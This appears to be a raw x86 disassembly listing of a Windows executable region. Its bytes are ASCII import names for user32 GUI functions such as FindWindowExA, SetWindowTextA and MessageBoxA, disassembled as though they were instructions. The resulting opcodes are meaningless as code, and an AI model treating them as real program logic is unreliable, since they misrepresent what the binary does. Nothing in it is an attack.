  413b11:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  413b18:	add    DWORD PTR [ebx+esi*2],eax
  413b1b:	ja     0x413b90
  413b1d:	arpl   WORD PTR [ecx+0x6e],sp
  413b20:	data16 add BYTE PTR [ebp+0x53],cl
  413b24:	push   esi
  413b25:	inc    ebx
  413b26:	push   edx
  413b27:	push   esp
  413b28:	cs fs ins BYTE PTR es:[edi],dx
  413b2b:	ins    BYTE PTR es:[edi],dx
  413b2c:	add    BYTE PTR [eax],al
  413b2e:	xor    eax,0x74654701
  413b33:	dec    ebp
  413b34:	outs   dx,BYTE PTR gs:[esi]
  413b36:	jne    0x413b81
  413b38:	je     0x413b9f
  413b3a:	ins    DWORD PTR es:[edi],dx
  413b3b:	dec    ecx
  413b3c:	outs   dx,BYTE PTR ds:[esi]
  413b3d:	outs   dx,WORD PTR ds:[esi]
  413b3f:	push   edi
  413b40:	add    BYTE PTR [eax],al
  413b42:	sub    BYTE PTR [ecx],al
  413b44:	inc    edi
  413b45:	gs je  0x413b94
  413b48:	popa   
  413b49:	jae    0x413bbf
  413b4b:	inc    ecx
  413b4c:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  413b50:	gs push eax
  413b52:	outs   dx,DWORD PTR ds:[esi]
  413b53:	jo     0x413bca
  413b55:	jo     0x413b57
  413b57:	add    dl,ah
  413b59:	add    BYTE PTR [esi+0x69],al
  413b5c:	outs   dx,BYTE PTR ds:[esi]
  413b5d:	fs push edi
  413b5f:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [ebp+0x1],bh
  413b6a:	dec    eax
  413b6b:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x74657261
  413b73:	add    BYTE PTR [esi+0x1],ah
  413b76:	inc    edi
  413b77:	gs je  0x413bcf
  413b7a:	jae    0x413be1
  413b7c:	jb     0x413bcd
  413b7e:	bound  ebp,QWORD PTR [edx+0x65]
  413b81:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  413b85:	outs   dx,WORD PTR ds:[esi]
  413b87:	jb     0x413bf6
  413b89:	popa   
  413b8a:	je     0x413bf5
  413b8c:	outs   dx,DWORD PTR ds:[esi]
  413b8d:	outs   dx,BYTE PTR ds:[esi]
  413b8e:	push   edi
  413b8f:	add    ch,bl
  413b91:	add    BYTE PTR [ebp+0x71],al
  413b94:	jne    0x413bf7
  413b96:	ins    BYTE PTR es:[edi],dx
  413b97:	push   edx
  413b98:	arpl   WORD PTR gs:[eax+eax*1-0x6c],si
  413b9d:	add    dl,BYTE PTR [edx+esi*2+0x61]
  413ba1:	outs   dx,BYTE PTR ds:[esi]
  413ba2:	jae    0x413c10
  413ba4:	popa   
  413ba5:	je     0x413c0c
  413ba7:	inc    ecx
  413ba8:	arpl   WORD PTR [ebx+0x65],sp
  413bab:	ins    BYTE PTR es:[edi],dx
  413bac:	gs jb  0x413c10
  413baf:	je     0x413c20
  413bb1:	jb     0x413c0a
  413bb3:	add    BYTE PTR [esi],bh
  413bb5:	add    BYTE PTR [ebx+0x68],al
  413bb8:	imul   ebp,DWORD PTR [esp+eiz*2+0x57],0x6f646e69
  413bc0:	ja     0x413c08
  413bc2:	jb     0x413c33
  413bc4:	ins    DWORD PTR es:[edi],dx
  413bc5:	push   eax
  413bc6:	outs   dx,DWORD PTR ds:[esi]
  413bc7:	imul   ebp,DWORD PTR [esi+0x74],0x28a0000
  413bce:	push   esp
  413bcf:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  413bd7:	ja     0x413c4c
  413bd9:	add    BYTE PTR [esi+0x616f4c01],dh
  413bdf:	fs dec ebp
  413be1:	outs   dx,BYTE PTR gs:[esi]
  413be3:	jne    0x413c26
  413be5:	add    al,al
  413be7:	add    BYTE PTR [ebp+0x6e],al
  413bea:	popa   
  413beb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x53]
  413bef:	arpl   WORD PTR [edx+0x6f],si
  413bf2:	ins    BYTE PTR es:[edi],dx
  413bf3:	ins    BYTE PTR es:[edi],dx
  413bf4:	inc    edx
  413bf5:	popa   
  413bf6:	jb     0x413bf8
  413bf8:	xor    al,BYTE PTR [ecx]
  413bfa:	inc    edi
  413bfb:	gs je  0x413c4b
  413bfe:	outs   dx,BYTE PTR gs:[esi]
  413c00:	jne    0x413c4b
  413c02:	je     0x413c69
  413c04:	ins    DWORD PTR es:[edi],dx
  413c05:	inc    ebx
  413c06:	outs   dx,DWORD PTR ds:[esi]
  413c07:	jne    0x413c77
  413c09:	je     0x413c0b
  413c0b:	add    cl,ah
  413c0d:	add    BYTE PTR [esi+0x69],al
  413c10:	outs   dx,BYTE PTR ds:[esi]
  413c11:	fs push edi
  413c13:	imul   ebp,DWORD PTR [esi+0x64],0x41776f
  413c1a:	rol    BYTE PTR [ecx],1
  413c1c:	dec    ebp
  413c1d:	gs jae 0x413c93
  413c20:	popa   
  413c21:	addr16 gs inc edx
  413c24:	outs   dx,DWORD PTR ds:[esi]
  413c25:	js     0x413c6c
  413c27:	js     0x413c80
  413c29:	add    BYTE PTR [eax+0x536e4901],al
  413c2f:	outs   dx,BYTE PTR gs:[esi]
  413c31:	fs dec ebp
  413c33:	gs jae 0x413ca9
  413c36:	popa   
  413c37:	addr16 gs add al,bl
  413c3b:	add    DWORD PTR [ebp+0x6f],ecx
  413c3e:	outs   dx,BYTE PTR ds:[esi]
  413c3f:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  413c47:	push   eax
  413c48:	outs   dx,DWORD PTR ds:[esi]
  413c49:	imul   ebp,DWORD PTR [esi+0x74],0x1680000
  413c50:	inc    edi
  413c51:	gs je  0x413cab
  413c54:	imul   ebp,DWORD PTR [esi+0x64],0x7d00776f
  413c5b:	add    dl,BYTE PTR [ebx+0x68]
  413c5e:	outs   dx,DWORD PTR ds:[esi]
  413c5f:	ja     0x413cb4
  413c61:	arpl   WORD PTR [edx+0x6f],si
  413c64:	ins    BYTE PTR es:[edi],dx
  413c65:	ins    BYTE PTR es:[edi],dx
  413c66:	inc    edx
  413c67:	popa   
  413c68:	jb     0x413c6a
  413c6a:	mov    cl,0x1
  413c6c:	dec    esp
  413c6d:	outs   dx,DWORD PTR ds:[esi]
  413c6e:	popa   
  413c6f:	fs dec ecx
  413c71:	ins    DWORD PTR es:[edi],dx
  413c72:	popa   
  413c73:	addr16 gs inc ecx
  413c76:	add    BYTE PTR [eax],al
  413c78:	cdq    
  413c79:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413c7d:	ins    BYTE PTR es:[edi],dx
  413c7e:	outs   dx,DWORD PTR ds:[esi]
  413c7f:	addr16 inc edx
  413c81:	outs   dx,DWORD PTR ds:[esi]
  413c82:	js     0x413ccd
  413c84:	outs   dx,BYTE PTR ds:[esi]
  413c85:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  413c8d:	jb     0x413cf0
  413c8f:	ins    DWORD PTR es:[edi],dx
  413c90:	inc    ecx
  413c91:	add    ch,al
  413c93:	add    DWORD PTR [ebp+0x61],ecx
  413c96:	jo     0x413cee
  413c98:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413c9f:	gs jns 0x413ce3
  413ca2:	add    BYTE PTR [eax],al
  413ca4:	sbb    BYTE PTR [edx],al
  413ca6:	push   edx
  413ca7:	gs ins DWORD PTR es:[edi],dx
  413ca9:	outs   dx,DWORD PTR ds:[esi]
  413caa:	jbe    0x413d11
  413cac:	push   eax
  413cad:	jb     0x413d1e
  413caf:	jo     0x413d08
  413cb1:	add    BYTE PTR [ecx+eax*1+0x47],ah
  413cb5:	gs je  0x413d0d
  413cb8:	jo     0x413d1e
  413cba:	popa   
  413cbb:	je     0x413d22
  413cbd:	push   edx
  413cbe:	outs   dx,BYTE PTR ds:[si]
  413cc0:	add    BYTE PTR [eax],al
  413cc2:	add    al,BYTE PTR [edx]
  413cc4:	push   edx
  413cc5:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  413cce:	popa   
  413ccf:	jae    0x413d44
  413cd1:	inc    ecx
  413cd2:	add    BYTE PTR [eax],al
  413cd4:	add    dl,BYTE PTR ds:[ebx+0x65]
  413cd8:	je     0x413d1e
  413cda:	ins    BYTE PTR es:[edi],dx
  413cdb:	addr16 dec ecx
  413cdd:	je     0x413d44
  413cdf:	ins    DWORD PTR es:[edi],dx
  413ce0:	push   esp
  413ce1:	gs js  0x413d58
  413ce4:	inc    ecx
  413ce5:	add    BYTE PTR [ebp+0x61724400],dh
  413ceb:	ja     0x413d3a
  413ced:	outs   dx,BYTE PTR gs:[esi]
  413cef:	jne    0x413d33
  413cf1:	popa   
  413cf2:	jb     0x413cf4
  413cf4:	sub    eax,DWORD PTR [ecx]
  413cf6:	inc    edi
  413cf7:	gs je  0x413d47
  413cfa:	outs   dx,BYTE PTR gs:[esi]
  413cfc:	jne    0x413cfe
  413cfe:	repnz add DWORD PTR [eax+0x6f],edx
  413d02:	jae    0x413d78
  413d04:	dec    ebp
  413d05:	gs jae 0x413d7b
  413d08:	popa   
  413d09:	addr16 gs push edi
  413d0c:	add    BYTE PTR [eax],al
  413d0e:	push   cs
  413d0f:	add    DWORD PTR [edi+0x65],eax
  413d12:	je     0x413d58
  413d14:	ins    BYTE PTR es:[edi],dx
  413d15:	addr16 inc ebx
  413d17:	je     0x413d8b
  413d19:	ins    BYTE PTR es:[edi],dx
  413d1a:	dec    ecx
  413d1b:	inc    esp
  413d1c:	add    BYTE PTR [eax],al
  413d1e:	mov    cl,0x2
  413d20:	push   esi
  413d21:	imul   ecx,DWORD PTR [ebx+0x65],0x79
  413d25:	push   ebx
  413d26:	arpl   WORD PTR [ecx+0x6e],sp
  413d29:	push   edi
  413d2a:	add    BYTE PTR [eax],al
  413d2c:	sbb    BYTE PTR [ecx],al
  413d2e:	inc    edi
  413d2f:	gs je  0x413d7b
  413d32:	arpl   WORD PTR [edi+0x6e],bp
  413d35:	dec    ecx
  413d36:	outs   dx,BYTE PTR ds:[esi]
  413d37:	outs   dx,WORD PTR ds:[esi]
  413d39:	add    cl,cl
  413d3b:	add    DWORD PTR [ebp+0x61],ecx
  413d3e:	jo     0x413d97
  413d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  413d47:	imul   ebp,DWORD PTR [esi+0x74],0x2d0073
  413d4e:	inc    ebx
  413d4f:	push   0x654e7261
  413d54:	js     0x413dca
  413d56:	push   edi
  413d57:	add    BYTE PTR [ecx],ch
  413d59:	add    dl,BYTE PTR [ebx+0x65]
  413d5c:	outs   dx,BYTE PTR ds:[esi]
  413d5d:	fs dec ebp
  413d5f:	gs jae 0x413dd5
  413d62:	popa   
  413d63:	addr16 gs push esp
  413d66:	imul   ebp,DWORD PTR [ebp+0x65],0x4174756f
  413d6d:	add    BYTE PTR [eax],ch
  413d6f:	add    BYTE PTR [ebx+0x68],al
  413d72:	popa   
  413d73:	jb     0x413dc1
  413d75:	outs   dx,DWORD PTR ds:[esi]
  413d76:	ja     0x413ddd
  413d78:	jb     0x413dbc
  413d7a:	jne    0x413de2
  413d7c:	push   di
  413d7e:	add    BYTE PTR [eax],al
  413d80:	ins    DWORD PTR es:[edi],dx
  413d81:	add    DWORD PTR [edi+0x65],eax
  413d84:	je     0x413ddd
  413d86:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  413d8d:	outs   dx,BYTE PTR ds:[esi]
  413d8e:	addr16 push edi
  413d90:	add    BYTE PTR [eax],al
  413d92:	mov    bh,0x2
  413d94:	push   edi
  413d95:	popa   
  413d96:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  413d9e:	jne    0x413e14
  413da0:	dec    ecx
  413da1:	fs ins BYTE PTR es:[edi],dx
  413da3:	add    BYTE PTR gs:[eax],al
  413da6:	mov    DWORD PTR [ecx],0x5670614d
  413dac:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413db3:	gs jns 0x413dfb
  413db6:	js     0x413e0f
  413db8:	add    BYTE PTR [eax],al
  413dba:	cmp    eax,0x65684300
  413dbf:	arpl   WORD PTR [ebx+0x52],bp
  413dc2:	popa   
  413dc3:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  413dcb:	outs   dx,BYTE PTR ds:[esi]
  413dcc:	add    BYTE PTR [eax],al
  413dce:	add    eax,0x6c6c4100
  413dd3:	outs   dx,DWORD PTR ds:[esi]
  413dd4:	ja     0x413e29
  413dd6:	gs je  0x413e1f
  413dd9:	outs   dx,DWORD PTR ds:[esi]
  413dda:	jb     0x413e41
  413ddc:	addr16 jb 0x413e4e
  413ddf:	jne    0x413e4f
  413de1:	fs push edi
  413de3:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413dea:	into   
  413deb:	add    DWORD PTR [ebp+0x65],ecx
  413dee:	jae    0x413e63
  413df0:	popa   
  413df1:	addr16 gs inc edx
  413df4:	outs   dx,DWORD PTR ds:[esi]
  413df5:	js     0x413e38
  413df7:	add    BYTE PTR [edx],bh
  413df9:	add    DWORD PTR [edi+0x65],eax
  413dfc:	je     0x413e4b
  413dfe:	gs jae 0x413e74
  413e01:	popa   
  413e02:	addr16 gs inc ecx
  413e05:	add    BYTE PTR [edx+0x2],cl
  413e08:	push   ebx
  413e09:	gs je  0x413e59
  413e0c:	outs   dx,BYTE PTR gs:[esi]
  413e0e:	jne    0x413e54
  413e10:	gs popaw 
  413e13:	jne    0x413e81
  413e15:	je     0x413e60
  413e17:	je     0x413e7e
  413e19:	ins    DWORD PTR es:[edi],dx
  413e1a:	add    BYTE PTR [eax],al
  413e1c:	aad    0x1
  413e1e:	dec    ebp
  413e1f:	gs jae 0x413e95
  413e22:	popa   
  413e23:	addr16 gs inc edx
  413e26:	outs   dx,DWORD PTR ds:[esi]
  413e27:	js     0x413e80
  413e29:	add    BYTE PTR [ecx],bh
  413e2b:	add    DWORD PTR [edi+0x65],eax
  413e2e:	je     0x413e7d
  413e30:	outs   dx,BYTE PTR gs:[esi]
  413e32:	jne    0x413e87
  413e34:	je     0x413ea8
  413e36:	imul   ebp,DWORD PTR [esi+0x67],0xb9000057
  413e3d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  413e41:	fs dec ebp
  413e43:	outs   dx,BYTE PTR gs:[esi]
  413e45:	jne    0x413e9e
  413e47:	add    BYTE PTR [ecx+eax*1+0x47],bl
  413e4b:	gs je  0x413ea1
  413e4e:	jns    0x413ec3
  413e50:	je     0x413eb7
  413e52:	ins    DWORD PTR es:[edi],dx
  413e53:	dec    ebp
  413e54:	gs je  0x413ec9
  413e57:	imul   esp,DWORD PTR [ebx+0x73],0x2260000
  413e5e:	push   ebx
  413e5f:	outs   dx,BYTE PTR gs:[esi]
  413e61:	fs dec ebp
  413e63:	gs jae 0x413ed9
  413e66:	popa   
  413e67:	addr16 gs inc ecx
  413e6a:	add    BYTE PTR [eax],al
  413e6c:	aaa    
  413e6d:	add    DWORD PTR [edi+0x65],eax
  413e70:	je     0x413ebf
  413e72:	outs   dx,BYTE PTR gs:[esi]
  413e74:	jne    0x413ec9
  413e76:	je     0x413ed9
  413e78:	je     0x413edf
  413e7a:	add    BYTE PTR [eax],al
  413e7c:	mov    bl,0x0
  413e7e:	inc    esp
  413e7f:	jb     0x413ee2
  413e81:	ja     0x413ecc
  413e83:	arpl   WORD PTR [edi+0x6e],bp
  413e86:	add    BYTE PTR [eax],al
  413e88:	xchg   ebp,eax
  413e89:	add    BYTE PTR [ebp+eiz*2+0x73],al
  413e8d:	je     0x413f01
  413e8f:	outs   dx,DWORD PTR ds:[esi]
  413e90:	jns    0x413ed5
  413e92:	jne    0x413f06
  413e94:	jae    0x413f05
  413e96:	jb     0x413e98
  413e98:	add    al,BYTE PTR [eax]
  413e9a:	inc    ecx
  413e9b:	fs push 0x75
  413e9e:	jae    0x413f14
  413ea0:	push   edi
  413ea1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  413ea8:	arpl   WORD PTR [eax+eax*1+0x0],si
  413eac:	pop    ecx
  413ead:	add    DWORD PTR [edi+0x65],eax
  413eb0:	je     0x413f05
  413eb2:	jns    0x413f27
  413eb4:	inc    ebx
  413eb5:	outs   dx,DWORD PTR ds:[esi]
  413eb6:	ins    BYTE PTR es:[edi],dx
  413eb7:	outs   dx,DWORD PTR ds:[esi]
  413eb8:	jb     0x413eba
  413eba:	jle    0x413ebd
  413ebc:	dec    eax
  413ebd:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  413ec5:	jne    0x413f10
  413ec7:	je     0x413f2e
  413ec9:	ins    DWORD PTR es:[edi],dx
  413eca:	add    BYTE PTR [eax],al
  413ecc:	or     DWORD PTR [eax],eax
  413ece:	inc    ecx
  413ecf:	jo     0x413f41
  413ed1:	outs   dx,BYTE PTR gs:[esi]
  413ed3:	fs dec ebp
  413ed5:	outs   dx,BYTE PTR gs:[esi]
  413ed7:	jne    0x413f30
  413ed9:	add    BYTE PTR [eax+eax*1],bh
  413edc:	inc    ebx
  413edd:	push   0x4d6b6365
  413ee2:	outs   dx,BYTE PTR gs:[esi]
  413ee4:	jne    0x413f38
  413ee6:	popa   
  413ee7:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  413eef:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  413ef6:	push   ebx
  413ef7:	je     0x413f6b
  413ef9:	imul   ebp,DWORD PTR [esi+0x67],0x21f0057
  413f00:	push   ebx
  413f01:	arpl   WORD PTR [edx+0x6f],si
  413f04:	ins    BYTE PTR es:[edi],dx
  413f05:	ins    BYTE PTR es:[edi],dx
  413f06:	push   edi
  413f07:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413f0e:	xor    DWORD PTR [eax],eax
  413f10:	inc    ebx
  413f11:	push   0x72507261
  413f16:	gs jbe 0x413f70
  413f19:	add    BYTE PTR [edi+0x2],bl
  413f1c:	push   ebx
  413f1d:	gs je  0x413f73
  413f20:	jns    0x413f95
  413f22:	inc    ebx
  413f23:	outs   dx,DWORD PTR ds:[esi]
  413f24:	ins    BYTE PTR es:[edi],dx
  413f25:	outs   dx,DWORD PTR ds:[esi]
  413f26:	jb     0x413f9b
  413f28:	add    BYTE PTR [eax],al
  413f2a:	sgdtd  [edi+0x65]
  413f2e:	je     0x413f74
  413f30:	ins    BYTE PTR es:[edi],dx
  413f31:	addr16 dec ecx
  413f33:	je     0x413f9a
  413f35:	ins    DWORD PTR es:[edi],dx
  413f36:	add    BYTE PTR [eax],al
  413f38:	dec    esp
  413f39:	add    dl,BYTE PTR [ebx+0x65]
  413f3c:	je     0x413f8b
  413f3e:	outs   dx,BYTE PTR gs:[esi]
  413f40:	jne    0x413f8b
  413f42:	je     0x413fa9
  413f44:	ins    DWORD PTR es:[edi],dx
  413f45:	inc    edx
  413f46:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x7370
  413f4e:	or     al,0x1
  413f50:	inc    edi
  413f51:	gs je  0x413f98
  413f54:	gs jae 0x413fc2
  413f57:	je     0x413fc8
  413f59:	jo     0x413fb2
  413f5b:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413f62:	inc    ebp
  413f63:	add    DWORD PTR [edi+0x65],eax
  413f66:	je     0x413fb8
  413f68:	popa   
  413f69:	jb     0x413fd0
  413f6b:	outs   dx,BYTE PTR ds:[esi]
  413f6c:	je     0x413f6e
  413f6e:	mov    BYTE PTR [eax],0x45
  413f71:	outs   dx,BYTE PTR ds:[esi]
  413f72:	fs push esp
  413f74:	popa   
  413f75:	jae    0x413fe2
  413f77:	add    BYTE PTR [eax+0x0],ah
  413f7a:	inc    ebx
  413f7b:	jb     0x413fe2
  413f7d:	popa   
  413f7e:	je     0x413fe5
  413f80:	dec    ebp
  413f81:	outs   dx,BYTE PTR gs:[esi]
  413f83:	jne    0x413f85
  413f85:	add    bl,dh
  413f87:	add    BYTE PTR [edi+0x65],al
  413f8a:	je     0x413fcf
  413f8c:	popa   
  413f8d:	jb     0x413ff4
  413f8f:	je     0x413fe1
  413f91:	outs   dx,DWORD PTR ds:[esi]
  413f92:	jae    0x413f94
  413f94:	sub    eax,DWORD PTR [edx]
  413f96:	push   ebx
  413f97:	outs   dx,BYTE PTR gs:[esi]
  413f99:	fs dec ebp
  413f9b:	gs jae 0x414011
  413f9e:	popa   
  413f9f:	addr16 gs push edi
  413fa2:	add    BYTE PTR [eax],al
  413fa4:	test   DWORD PTR [ecx],eax
  413fa6:	dec    ecx
  413fa7:	outs   dx,BYTE PTR ds:[esi]
  413fa8:	jae    0x41400f
  413faa:	jb     0x414020
  413fac:	dec    ebp
  413fad:	outs   dx,BYTE PTR gs:[esi]
  413faf:	jne    0x413ffa
  413fb1:	je     0x414018
  413fb3:	ins    DWORD PTR es:[edi],dx
  413fb4:	push   edi
  413fb5:	add    BYTE PTR [ecx+0x0],ah
  413fb8:	inc    ebx
  413fb9:	jb     0x414020
  413fbb:	popa   
  413fbc:	je     0x414023
  413fbe:	push   eax
  413fbf:	outs   dx,DWORD PTR ds:[esi]
  413fc0:	jo     0x414037
  413fc2:	jo     0x414011
  413fc4:	outs   dx,BYTE PTR gs:[esi]
  413fc6:	jne    0x413fc8
  413fc8:	inc    eax
  413fc9:	add    DWORD PTR [edi+0x65],eax
  413fcc:	je     0x41401b
  413fce:	outs   dx,DWORD PTR ds:[esi]
  413fcf:	outs   dx,BYTE PTR ds:[esi]
  413fd0:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6f666e49
  413fd8:	push   edi
  413fd9:	add    al,cl
  413fdb:	add    DWORD PTR [ebp+0x61],ecx
  413fde:	jo     0x414036
  413fe0:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413fe7:	gs jns 0x414041
  413fea:	add    BYTE PTR [eax],al
  413fec:	out    0x0,eax
  413fee:	inc    esi
  413fef:	jb     0x414052
  413ff1:	ins    DWORD PTR es:[edi],dx
  413ff2:	gs push edx
  413ff4:	arpl   WORD PTR gs:[eax+eax*1-0x41],si
  413ff9:	add    BYTE PTR [ebp+0x6e],al
  413ffc:	popa   
  413ffd:	bound  ebp,QWORD PTR [ebp+eiz*2+0x4d]
  414001:	outs   dx,BYTE PTR gs:[esi]
  414003:	jne    0x41404e
  414005:	je     0x41406c
  414007:	ins    DWORD PTR es:[edi],dx
  414008:	add    BYTE PTR [eax],al
  41400a:	fwait
  41400b:	add    dl,BYTE PTR [ebp+0x6e]
  41400e:	ins    BYTE PTR es:[edi],dx
  41400f:	outs   dx,DWORD PTR ds:[esi]
  414010:	popa   
  414011:	fs dec ebx
  414013:	gs jns 0x414078
  414016:	outs   dx,DWORD PTR ds:[esi]
  414017:	popa   
  414018:	jb     0x41407e
  41401a:	dec    esp
  41401b:	popa   
  41401c:	jns    0x41408d
  41401e:	jne    0x414094
  414020:	add    BYTE PTR [eax],al
  414022:	mov    esp,0x6e695702
  414027:	outs   dx,DWORD PTR fs:[esi]
  414029:	ja     0x414071
  41402b:	jb     0x41409c
  41402d:	ins    DWORD PTR es:[edi],dx
  41402e:	push   eax
  41402f:	outs   dx,DWORD PTR ds:[esi]
  414030:	imul   ebp,DWORD PTR [esi+0x74],0x4400ab00
  414037:	jb     0x41409a
  414039:	ja     0x41407c
  41403b:	outs   dx,BYTE PTR ds:[esi]
  41403c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  414043:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  414048:	and    BYTE PTR [edx],al
  41404a:	push   ebx
  41404b:	arpl   WORD PTR [edx+0x6f],si
  41404e:	ins    BYTE PTR es:[edi],dx
  41404f:	ins    BYTE PTR es:[edi],dx
  414050:	push   edi
  414051:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  414058:	add    BYTE PTR [eax],al
  41405a:	pop    eax
  41405b:	add    dl,BYTE PTR [ebx+0x65]
  41405e:	je     0x4140b2
  414060:	arpl   WORD PTR gs:[eax+eax*1+0x3d],si
  414065:	add    dl,BYTE PTR [ebx+0x65]
  414068:	je     0x4140ae
  41406a:	ins    BYTE PTR es:[edi],dx
  41406b:	addr16 dec ecx
  41406d:	je     0x4140d4
  41406f:	ins    DWORD PTR es:[edi],dx
  414070:	dec    ecx
  414071:	outs   dx,BYTE PTR ds:[esi]
  414072:	je     0x414074
  414074:	or     eax,0x67654200
  414079:	imul   ebp,DWORD PTR [esi+0x50],0x746e6961
  414080:	add    BYTE PTR [eax],al
  414082:	pop    ebp
  414083:	add    BYTE PTR [ebx+0x72],al
  414086:	gs popa 
  414088:	je     0x4140ef
  41408a:	dec    ecx
  41408b:	arpl   WORD PTR [edi+0x6e],bp
  41408e:	dec    ecx
  41408f:	outs   dx,BYTE PTR ds:[esi]
  414090:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  414098:	dec    esi
  414099:	add    dl,BYTE PTR [ebx+0x65]
  41409c:	je     0x4140eb
  41409e:	outs   dx,BYTE PTR gs:[esi]
  4140a0:	jne    0x4140eb
  4140a2:	je     0x414109
  4140a4:	ins    DWORD PTR es:[edi],dx
  4140a5:	dec    ecx
  4140a6:	outs   dx,BYTE PTR ds:[esi]
  4140a7:	outs   dx,WORD PTR ds:[esi]
  4140a9:	push   edi
  4140aa:	add    BYTE PTR [eax],al
  4140ac:	pop    edx
  4140ad:	add    dl,BYTE PTR [ebx+0x65]
  4140b0:	je     0x414105
  4140b2:	arpl   WORD PTR [edx+0x6f],si
  4140b5:	ins    BYTE PTR es:[edi],dx
  4140b6:	ins    BYTE PTR es:[edi],dx
  4140b7:	dec    ecx
  4140b8:	outs   dx,BYTE PTR ds:[esi]
  4140b9:	outs   dx,WORD PTR ds:[esi]
  4140bb:	add    BYTE PTR [edx],dh
  4140bd:	add    BYTE PTR [ebx+0x68],al
  4140c0:	popa   
  4140c1:	jb     0x414117
  4140c3:	outs   dx,DWORD PTR ds:[esi]
  4140c4:	dec    edi
  4140c5:	gs ins DWORD PTR es:[edi],dx
  4140c7:	inc    ecx
  4140c8:	add    BYTE PTR [eax],al
  4140ca:	sub    eax,0x6e655302
  4140cf:	fs dec esi
  4140d1:	outs   dx,DWORD PTR ds:[esi]
  4140d2:	je     0x41413d
  4140d4:	data16 jns 0x414124
  4140d7:	gs jae 0x41414d
  4140da:	popa   
  4140db:	addr16 gs push edi
  4140de:	add    BYTE PTR [eax],al
  4140e0:	sti    
  4140e1:	add    BYTE PTR [edi+0x65],al
  4140e4:	je     0x414129
  4140e6:	ins    BYTE PTR es:[edi],dx
  4140e7:	popa   
  4140e8:	jae    0x41415d
  4140ea:	dec    esi
  4140eb:	popa   
  4140ec:	ins    DWORD PTR es:[edi],dx
  4140ed:	gs push edi
  4140ef:	add    BYTE PTR [ebx+0x61725402],dl
  4140f5:	outs   dx,BYTE PTR ds:[esi]
  4140f6:	jae    0x414164
  4140f8:	popa   
  4140f9:	je     0x414160
  4140fb:	inc    ecx
  4140fc:	arpl   WORD PTR [ebx+0x65],sp
  4140ff:	ins    BYTE PTR es:[edi],dx
  414100:	gs jb  0x414164
  414103:	je     0x414174
  414105:	jb     0x414148
  414107:	add    BYTE PTR [ebx+0x2],bh
  41410a:	push   ebx
  41410b:	push   0x7543776f
  414110:	jb     0x414185
  414112:	outs   dx,DWORD PTR ds:[esi]
  414113:	jb     0x414115
  414115:	add    BYTE PTR [ebx+0x2],dh
  414118:	push   ebx
  414119:	gs je  0x414173
  41411c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  414123:	js     0x414199
  414125:	inc    ecx
  414126:	add    BYTE PTR [eax],al
  414128:	add    BYTE PTR es:[ebx+0x68],al
  41412c:	popa   
  41412d:	jb     0x41417b
  41412f:	outs   dx,DWORD PTR ds:[esi]
  414130:	ja     0x414197
  414132:	jb     0x414175
  414134:	add    BYTE PTR [eax],al
  414136:	xchg   BYTE PTR [ecx],al
  414138:	dec    ecx
  414139:	outs   dx,BYTE PTR ds:[esi]
  41413a:	jae    0x4141a1
  41413c:	jb     0x4141b2
  41413e:	dec    ebp
  41413f:	outs   dx,BYTE PTR gs:[esi]
  414141:	jne    0x41419a
  414143:	add    BYTE PTR [eax],cl
  414145:	add    BYTE PTR [ecx+0x70],al
  414148:	jo     0x4141af
  41414a:	outs   dx,BYTE PTR ds:[esi]
  41414b:	fs dec ebp
  41414d:	outs   dx,BYTE PTR gs:[esi]
  41414f:	jne    0x414192
  414151:	add    BYTE PTR [edx+0x1],ch
  414154:	inc    edi
  414155:	gs je  0x4141af
  414158:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41415f:	add    BYTE PTR [ecx+0x2],bl
  414162:	push   ebx
  414163:	gs je  0x4141b8
  414166:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  41416b:	jo     0x4141e1
  41416d:	jns    0x41416f
  41416f:	add    BYTE PTR [edx+0x1],bl
  414172:	inc    edi
  414173:	gs je  0x4141c9
  414176:	jns    0x4141eb
  414178:	inc    ebx
  414179:	outs   dx,DWORD PTR ds:[esi]
  41417a:	ins    BYTE PTR es:[edi],dx
  41417b:	outs   dx,DWORD PTR ds:[esi]
  41417c:	jb     0x4141c0
  41417e:	jb     0x4141f5
  414180:	jae    0x4141ea
  414182:	add    BYTE PTR [eax],al
  414184:	jg     0x414188
  414186:	push   ebx
  414187:	push   0x6957776f
  41418c:	outs   dx,BYTE PTR ds:[esi]
  41418d:	outs   dx,DWORD PTR fs:[esi]
  41418f:	ja     0x414191
  414191:	add    BYTE PTR [eax+eax*1],ah
  414194:	inc    ebx
  414195:	push   0x65676e61
  41419a:	dec    ebp
  41419b:	outs   dx,BYTE PTR gs:[esi]
  41419d:	jne    0x4141f6
  41419f:	add    al,ah
